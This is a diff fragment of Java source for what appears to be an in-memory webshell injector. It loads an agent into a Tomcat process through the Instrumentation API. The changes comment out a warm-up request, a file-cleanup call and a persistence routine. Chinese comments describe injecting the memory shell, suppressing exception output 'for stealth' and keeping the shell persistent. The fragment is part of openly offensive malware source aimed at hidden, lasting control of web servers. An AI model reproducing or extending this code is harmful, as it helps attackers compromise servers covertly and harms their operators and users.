@@ -29,9 +29,9 @@ public class AgentEntry {
     public static void agentmain(String agentArgs, Instrumentation inst) {
         //先访问一次目标http服务.
         // 这主要是针对目标Tomcat重启后,agent加载到Tomcat进程的情况：
-        //   如果不先访问一次，重启后的Tomcat进程中不会有ApplicationFilterChain类，
+        //   如果不先访问一次，重启后Tomcat的ApplicationFilterChain类不会被加载到内存中，
         //   所以在下面的字节码修改操作之前，会找不到这个类，从而agent内存马注入失败.
-        initAccess();
+//        initAccess();
 
         inst.addTransformer(new Transformer(), true);
         if (agentArgs.indexOf("^") >= 0) {
@@ -62,12 +62,12 @@ public class AgentEntry {
 
             readInjectFile(AgentEntry.currentPath);
             readAgentFile(AgentEntry.currentPath);
-            clear(AgentEntry.currentPath);
+//            clear(AgentEntry.currentPath);
         } catch (Exception e) {
             // 为了隐蔽,不要打印异常信息
         }
         //agent内存马持久化
-        AgentEntry.persist();
+//        AgentEntry.persist();
     }
 
     public static void persist() {
